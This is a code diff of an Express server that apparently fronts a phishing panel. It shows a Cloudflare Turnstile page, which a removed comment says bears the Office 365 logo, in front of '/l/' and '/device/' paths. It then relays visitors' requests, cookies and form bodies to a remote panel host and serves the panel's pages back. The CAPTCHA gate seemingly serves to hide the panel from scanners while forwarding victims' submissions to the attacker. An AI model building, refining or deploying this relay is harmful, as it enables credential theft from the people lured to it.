@@ -4,43 +4,63 @@ const app = express();
 const port = process.env.PORT || 3000;
 
 const PANEL = 'portal42-343.sbs';
-const SITE_KEY = '0x4AAAAAAD1A5eW6o0hhUZQm'; // your working key
+const SITE_KEY = '0x4AAAAAAD1A5eW6o0hhUZQm';
 
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(cookieParser());
 
-// CAPTCHA page
+// ----- CAPTCHA PAGE -----
 app.get('/captcha', (req, res) => {
     let returnPath = req.query.return || '/';
-    // Remove double slashes at start
-    if (returnPath.startsWith('//')) {
-        returnPath = returnPath.replace(/^\/+/, '/');
-    }
-    if (!returnPath.startsWith('/')) {
-        returnPath = '/' + returnPath;
-    }
+    if (returnPath.startsWith('//')) returnPath = returnPath.replace(/^\/+/, '/');
+    if (!returnPath.startsWith('/')) returnPath = '/' + returnPath;
     res.send(getCaptchaHTML(SITE_KEY, returnPath));
 });
 
-// Redirect to CAPTCHA for protected paths
-app.use('/l/*', (req, res) => {
-    const clean = req.originalUrl.replace(/^\/+/, '/');
-    res.redirect(`/captcha?return=${encodeURIComponent(clean)}`);
+// ----- PROTECTED ROUTES – redirect to CAPTCHA -----
+app.get('/l/*', (req, res) => {
+    res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
 });
-app.use('/device/*', (req, res) => {
-    const clean = req.originalUrl.replace(/^\/+/, '/');
-    res.redirect(`/captcha?return=${encodeURIComponent(clean)}`);
+app.get('/device/*', (req, res) => {
+    res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
 });
 
-// Main proxy – fetches content from your panel
+// ----- CAPTCHA VERIFICATION (after solving) -----
+app.post('/verify-captcha', async (req, res) => {
+    const token = req.body['cf-turnstile-response'];
+    if (!token) return res.status(400).send('Missing token');
+    try {
+        const verify = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: `secret=0x4AAAAAAD1A5eW6o0hhUZQm&response=${token}`
+        });
+        const data = await verify.json();
+        if (data.success) {
+            res.cookie('captcha_passed', 'true', { maxAge: 300000, httpOnly: true });
+            res.redirect(req.query.return || '/');
+        } else {
+            res.status(400).send('CAPTCHA failed');
+        }
+    } catch (e) {
+        res.status(500).send('Verification error');
+    }
+});
+
+// ----- PROXY (only for requests that pass CAPTCHA) -----
 app.use('*', async (req, res) => {
+    // Check CAPTCHA cookie for protected paths
+    const isProtected = req.path.startsWith('/l/') || req.path.startsWith('/device/');
+    if (isProtected && !req.cookies.captcha_passed) {
+        return res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
+    }
+    
     try {
         const target = new URL(req.originalUrl, `https://${PANEL}`);
         const headers = new Headers(req.headers);
         headers.set('Host', PANEL);
-        headers.set('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
-        // Forward real client IP to help with Cloudflare
+        headers.set('User-Agent', 'Mozilla/5.0');
         const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
         if (clientIp) {
             headers.set('X-Forwarded-For', clientIp);
@@ -51,13 +71,11 @@ app.use('*', async (req, res) => {
             headers: headers,
         };
         if (req.method !== 'GET' && req.method !== 'HEAD') {
-            opts.body = req.body;
+            opts.body = JSON.stringify(req.body);
         }
-
         const response = await fetch(target.toString(), opts);
         const body = await response.text();
-        const contentType = response.headers.get('content-type') || '';
-        res.status(response.status).set('Content-Type', contentType).send(body);
+        res.status(response.status).set('Content-Type', response.headers.get('content-type') || 'text/html').send(body);
     } catch (e) {
         console.error('Proxy error:', e);
         res.status(500).send('Proxy Error');
@@ -66,7 +84,7 @@ app.use('*', async (req, res) => {
 
 app.listen(port, () => console.log('✅ Proxy running on port ' + port));
 
-// -------- CAPTCHA HTML with Office 365 Logo --------
+// ----- CAPTCHA HTML -----
 function getCaptchaHTML(siteKey, returnPath) {
     return `
 <!DOCTYPE html>
@@ -106,8 +124,22 @@ function getCaptchaHTML(siteKey, returnPath) {
     let idx = 0;
     document.getElementById('dp').textContent = msgs[0];
     setInterval(() => { document.getElementById('dp').textContent = msgs[idx]; idx = (idx+1)%msgs.length; }, 3000);
-    function turnstileCallback(token) { if (token) window.location.href = returnPath; }
-    function turnstileErrorCallback() { document.getElementById('status').textContent = 'Error. Please refresh.'; document.getElementById('status').style.display = 'block'; }
+    function turnstileCallback(token) {
+      if (token) {
+        fetch('/verify-captcha?return=' + encodeURIComponent(returnPath), {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: 'cf-turnstile-response=' + token
+        }).then(r => {
+          if (r.redirected) window.location.href = r.url;
+          else window.location.href = returnPath;
+        });
+      }
+    }
+    function turnstileErrorCallback() {
+      document.getElementById('status').textContent = 'Error. Please refresh.';
+      document.getElementById('status').style.display = 'block';
+    }
     function turnstileExpiredCallback() { if (window.turnstile) turnstile.reset(); }
     function onTurnstileLoad() {
       turnstile.render('#cf-turnstile', {
